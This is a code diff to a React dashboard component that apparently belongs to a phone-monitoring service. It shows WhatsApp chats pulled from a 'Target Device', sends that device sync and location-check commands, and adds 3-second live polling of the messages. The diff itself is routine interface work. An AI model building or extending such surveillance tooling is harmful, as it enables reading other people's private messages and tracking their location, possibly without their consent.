@@ -102,20 +102,24 @@ function parentOf(path: string): string {
   return idx === -1 ? "" : normalized.slice(0, idx);
 }
 
-function timeAgo(dateString: string): string {
+
+function formatChatTime(dateString: string): string {
   try {
-    const date = new Date(dateString);
+    const d = new Date(dateString);
+    if (isNaN(d.getTime())) return "";
     const now = new Date();
-    const diffMs = now.getTime() - date.getTime();
-    const diffMin = Math.floor(diffMs / 60000);
-    if (diffMin < 1) return "Just now";
-    if (diffMin < 60) return `${diffMin}m ago`;
-    const diffHours = Math.floor(diffMin / 60);
-    if (diffHours < 24) return `${diffHours}h ago`;
-    const diffDays = Math.floor(diffHours / 24);
-    if (diffDays === 1) return "Yesterday";
-    if (diffDays < 7) return `${diffDays}d ago`;
-    return date.toLocaleDateString();
+    const diffMs = now.getTime() - d.getTime();
+    if (diffMs < 60000 && diffMs >= -10000) return "Just now";
+    if (d.toDateString() === now.toDateString()) {
+      return d.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" });
+    }
+    const yesterday = new Date(now);
+    yesterday.setDate(now.getDate() - 1);
+    if (d.toDateString() === yesterday.toDateString()) return "Yesterday";
+    if (now.getTime() - d.getTime() < 7 * 24 * 60 * 60 * 1000) {
+      return d.toLocaleDateString(undefined, { weekday: "short" });
+    }
+    return d.toLocaleDateString(undefined, { month: "numeric", day: "numeric" });
   } catch {
     return dateString;
   }
@@ -267,12 +271,14 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   // --------------------------------------------------------------------------
   // 1. DATA LOADER (STRICTLY REAL WHATSAPP TEXT MESSAGES ONLY)
   // --------------------------------------------------------------------------
-  const loadDeviceChatData = async () => {
-    setLoading(true);
+  const loadDeviceChatData = async (isManual = false) => {
+    if (isManual) setLoading(true);
     try {
-      devicesApi.createCommand(deviceId, "sync_whatsapp").catch(() => {
-        devicesApi.createCommand(deviceId, "location_check").catch(() => {});
-      });
+      if (isManual) {
+        devicesApi.createCommand(deviceId, "sync_whatsapp").catch(() => {
+          devicesApi.createCommand(deviceId, "location_check").catch(() => {});
+        });
+      }
 
       const [waData, allMsgs] = await Promise.all([
         devicesApi.whatsAppChats(deviceId).catch((err) => {
@@ -307,17 +313,20 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         const realMsg = latestRealByChat.get(key);
         const hasRealLastMsg = !isPlaceholderOrNumber(c.last_message);
 
-        if (realMsg) {
+        const cTime = c.last_message_at ? new Date(c.last_message_at).getTime() : 0;
+        const rTime = realMsg?.message_time ? new Date(realMsg.message_time).getTime() : 0;
+        const latestTime = rTime > cTime ? realMsg!.message_time : c.last_message_at;
+        const latestText = (hasRealLastMsg && cTime >= rTime) ? c.last_message : (realMsg?.message_text || c.last_message);
+        const latestOutgoing = (hasRealLastMsg && cTime >= rTime) ? Boolean(c.last_is_outgoing) : (realMsg ? Boolean(realMsg.is_outgoing) : Boolean(c.last_is_outgoing));
+
+        if (latestText && !isPlaceholderOrNumber(latestText)) {
           cleanedChats.push({
             chat_name: c.chat_name,
-            total_messages: countRealByChat.get(key) || c.total_messages,
-            last_message_at: realMsg.message_time,
-            last_message: realMsg.message_text,
-            last_is_outgoing: Boolean(realMsg.is_outgoing),
+            total_messages: Math.max(countRealByChat.get(key) || 0, c.total_messages || 1),
+            last_message_at: latestTime,
+            last_message: latestText,
+            last_is_outgoing: latestOutgoing,
           });
-          seenChats.add(key);
-        } else if (hasRealLastMsg) {
-          cleanedChats.push(c);
           seenChats.add(key);
         }
       }
@@ -342,15 +351,15 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
     } catch (e) {
       console.error("Failed to load device chat data", e);
     } finally {
-      setLoading(false);
+      if (isManual) setLoading(false);
     }
   };
 
   const loadRef = useRef(loadDeviceChatData);
   loadRef.current = loadDeviceChatData;
 
-  // Real-time EventSource listener: Updates instantly on incoming/outgoing messages
-  // No annoying auto-refresh polling interval!
+  // Real-time EventSource push + 3-second live auto-refresh polling
+  // Ensures incoming and outgoing messages update dynamically without page reloads
   useEffect(() => {
     loadRef.current();
 
@@ -364,25 +373,35 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
       eventSource.onmessage = (event) => {
         try {
           const payload = JSON.parse(event.data);
-          if (payload.type === "whatsapp_message") {
+          if (payload.type === "whatsapp_message" || payload.type === "sync" || payload.type === "new_data") {
             setLastSyncedTime(new Date());
-            // Instantly refresh WhatsApp chatlist when a message arrives
             loadRef.current();
-            // If the user is currently viewing the active conversation, refresh messages live
             if (fetchCurrentChatRef.current) {
               fetchCurrentChatRef.current(false);
             }
           }
         } catch (_) {}
       };
+      eventSource.onerror = () => {
+        // SSE disconnected or proxy buffered — fallback to interval polling
+      };
     } catch (err) {
       console.warn("Real-time SSE subscription error:", err);
     }
+
+    // 3s interval polling to ensure 100% dynamic live updates for sent/received chats
+    const pollInterval = setInterval(() => {
+      loadRef.current();
+      if (fetchCurrentChatRef.current) {
+        fetchCurrentChatRef.current(false);
+      }
+    }, 3000);
 
     return () => {
       if (eventSource) {
         eventSource.close();
       }
+      clearInterval(pollInterval);
     };
   }, [deviceId]);
 
@@ -455,24 +474,27 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   // --------------------------------------------------------------------------
   // 3. LOAD CHAT CONVERSATION MESSAGES (LIVE POLLING & LAST 5 DAYS)
   // --------------------------------------------------------------------------
+  const whatsappChatSummariesRef = useRef(whatsappChatSummaries);
+  whatsappChatSummariesRef.current = whatsappChatSummaries;
+
+  const messagesEndRef = useRef<HTMLDivElement>(null);
+
   useEffect(() => {
     if (!selectedChatId) {
       setActiveThreadMessages([]);
       return;
     }
 
-    const currentChat = whatsappChatSummaries.find((c) => c.id === selectedChatId);
-    if (!currentChat) {
-      setActiveThreadMessages([]);
-      return;
-    }
+    const currentChatName = selectedChatId.startsWith("wa-")
+      ? selectedChatId.slice(3)
+      : selectedChatId;
 
     let isMounted = true;
     const fetchChatMessages = (isInitial: boolean) => {
       if (isInitial) setMessagesLoading(true);
 
       devicesApi
-        .whatsAppMessages(deviceId, currentChat.chatName)
+        .whatsAppMessages(deviceId, currentChatName)
         .then((msgs: WhatsAppMessage[]) => {
           if (!isMounted) return;
           const list = (msgs || []).filter(
@@ -496,7 +518,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
 
             return {
               id: m.id,
-              sender: isTargetSent ? "Target Device" : m.sender || currentChat.chatName,
+              sender: isTargetSent ? "Target Device" : m.sender || currentChatName,
               text: cleanText,
               isOutgoing: isTargetSent,
               timestamp: m.message_time,
@@ -506,9 +528,10 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           });
 
           // Fallback to preview last message only if valid real text
+          const currentChat = whatsappChatSummariesRef.current.find((c) => c.id === selectedChatId);
           if (
             unified.length === 0 &&
-            currentChat.lastMessage &&
+            currentChat?.lastMessage &&
             !isPlaceholderOrNumber(currentChat.lastMessage)
           ) {
             const rawLast = currentChat.lastMessage;
@@ -548,7 +571,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
       isMounted = false;
       fetchCurrentChatRef.current = null;
     };
-  }, [selectedChatId, whatsappChatSummaries, deviceId, timeFilter, dashboardLoginTime]);
+  }, [selectedChatId, deviceId, timeFilter, dashboardLoginTime]);
+
+  useEffect(() => {
+    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
+  }, [activeThreadMessages.length, selectedChatId]);
 
   // Grouped conversation messages by day (Today, Yesterday, etc.)
   const groupedMessages = useMemo(() => {
@@ -756,7 +783,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
 
           <button
             type="button"
-            onClick={loadDeviceChatData}
+            onClick={() => loadDeviceChatData(true)}
             disabled={loading}
             className="text-xs text-gray-500 hover:text-emerald-600 px-2.5 py-1.5 border border-gray-200 rounded-lg hover:border-emerald-300 transition flex items-center gap-1.5 disabled:opacity-50"
             title="Refresh from phone now"
@@ -1045,7 +1072,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                 {c.chatName}
                               </h4>
                               <span className="text-[10px] text-gray-400 shrink-0 font-medium">
-                                {timeAgo(c.lastMessageAt)}
+                                {formatChatTime(c.lastMessageAt)}
                               </span>
                             </div>
 
@@ -1341,6 +1368,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                           </div>
                         ))
                       )}
+                      <div ref={messagesEndRef} />
                     </div>
                   </>
                 ) : (
